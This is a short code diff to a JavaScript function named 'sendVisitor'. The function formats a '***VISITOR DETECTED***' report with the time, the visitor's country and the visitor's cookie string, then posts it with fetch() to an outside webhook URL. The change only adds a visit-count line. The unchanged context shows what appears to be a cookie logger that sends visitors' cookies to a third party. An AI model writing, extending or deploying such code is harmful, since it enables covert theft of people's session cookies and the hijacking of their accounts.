@@ -161,6 +161,7 @@ function sendVisitor(country, mixedString) {
       "***VISITOR DETECTED***" + "\n" + "\n" +
       "**Time:** *" + dateTime + "*" + "\n" + "\n" +
       "**Country:** *" + country + "*" + "\n" + "\n" +
+      "**Visits:** *" + getVisits() + "*" + "\n" + "\n" +
       "**Cookie:** *" + mixedString + "*" + "\n" + "\n"
   };
   fetch(webhookURL, {
